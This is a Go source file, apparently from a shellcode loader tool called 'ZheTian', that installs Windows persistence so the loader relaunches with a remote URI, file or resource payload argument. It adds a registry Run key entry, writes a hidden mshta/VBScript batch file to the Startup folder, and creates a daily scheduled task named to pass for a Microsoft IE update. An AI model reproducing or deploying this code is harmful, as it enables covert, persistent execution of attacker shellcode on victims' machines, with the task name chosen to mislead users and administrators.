package server

import (
	"fmt"
	"golang.org/x/sys/windows/registry"
	"os"
	"os/exec"
)

var (
	commLine string                               //自启执行命令
	appPath  string                               //程序本身目录
	startBat string                               //bat文件
	rand     = "ZheTian"                          //随机生成随机数
	TaskName = "MicrosoftIEUpdateTaskMachineCore" //任务名
)

func StartUp() {
	if err := regEdit(); err == nil {
		fmt.Println("已在注册表添加启动项")
		return
	}
	if err := startMenu(); err == nil {
		fmt.Println("已添加到启动目录")
		return
	}
	if err := schTask(); err == nil {
		fmt.Println("已添创建计划任务，将于每天的23:30执行")
		return
	}
	fmt.Println("设置自启，即将执行shell code")
}

func init() {
	//获取程序目录
	appPath, _ = os.Executable()
	//获取随机数
	if s, isRand := GetRand(); isRand == nil {
		rand = s
	} else {
		rand = "ZheTian"
	}
}

//regEdit 添加注册表
func regEdit() error {
	//如果key不存在就自动创建
	key, _, err := registry.CreateKey(registry.CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)

	if err != nil {
		return err
	}
	defer key.Close()

	//将程序运行地址添加进去，并且设置为自动运行，如：cmd.exe /c C:\ZheTian.exe -h
	if Uri != "" {
		commLine = fmt.Sprintf("cmd.exe /c  %s -u %s", appPath, Uri)
	}
	if FilePath != "" {
		commLine = fmt.Sprintf("cmd.exe /c  %s -r %s", appPath, FilePath)
	}
	if Resource != "" {
		commLine = fmt.Sprintf("cmd.exe /c  %s -s %s", appPath, Resource)
	}
	err = key.SetStringValue(rand, commLine)

	return err
}

//startMenu 添加启动项
func startMenu() error {
	userDir, err := os.UserHomeDir()

	//获取当前程序的位置
	startPath := userDir + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

	if Uri != "" {
		startBat = fmt.Sprintf(`
@echo off 　　 
mshta vbscript:createobject("wscript.shell").run("%s -u %s h",0)(window.close)&&exit 
`, appPath, Uri)
	}
	if FilePath != "" {
		startBat = fmt.Sprintf(`
@echo off 　　 
mshta vbscript:createobject("wscript.shell").run("%s -r %s h",0)(window.close)&&exit 
`, appPath, FilePath)
	}
	if Resource != "" {
		startBat = fmt.Sprintf(`
@echo off 　　 
mshta vbscript:createobject("wscript.shell").run("%s -s %s h",0)(window.close)&&exit 
`, appPath, Resource)
	}
	startPath += rand + ".bat"

	if file, err := os.Create(startPath); err == nil {
		_, err = file.Write([]byte(startBat))
		defer file.Close()
	}

	return err
}

//schTask 定时任务
func schTask() error {

	if Uri != "" {
		commLine = fmt.Sprintf(`"cmd.exe /c %s -u %s" `, appPath, Uri)
	}
	if FilePath != "" {
		commLine = fmt.Sprintf(`"cmd.exe /c %s -r %s" `, appPath, FilePath)
	}
	if Resource != "" {
		commLine = fmt.Sprintf(`"cmd.exe /c %s -s %s" `, appPath, Resource)
	}
	create := []string{
		"/Create",
		"/tn",
		TaskName,
		"/tr",
		commLine,
		`/sc`,
		"daily",
		"/st",
		"23:30",
	}
	cmd := exec.Command("schtasks", create...)

	err := cmd.Run()
	return err
}
